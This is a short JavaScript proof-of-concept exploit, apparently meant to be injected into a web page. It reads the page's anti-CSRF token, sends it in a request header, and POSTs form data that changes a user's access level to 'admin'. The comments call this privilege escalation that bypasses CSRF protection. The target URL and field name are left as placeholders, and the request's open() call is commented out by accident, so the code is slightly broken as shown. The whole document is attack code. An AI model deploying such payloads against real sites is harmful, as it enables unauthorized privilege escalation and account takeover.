//CSRF POST target
var privEscTarget = "?"; //URL here - read and extract anti-CSRF token
var extract = document.querySelector('input[name=?]').value; //fetch token value

function exploit() {
//instantiating XMLHttpRequest
var poc = new XMLHttpRequest();
//parse token to XHR to bypass CSRF protection & assign HTTP POST data payload poc.open("POST", privEscTarget);
poc.setRequestHeader("X-CSRF-TOKEN", extract);
var fd = new FormData();
fd.append('access', 'admin'); //change access to type to admin
//execute
poc.send(fd);
}
//call function to perform exploit
exploit();
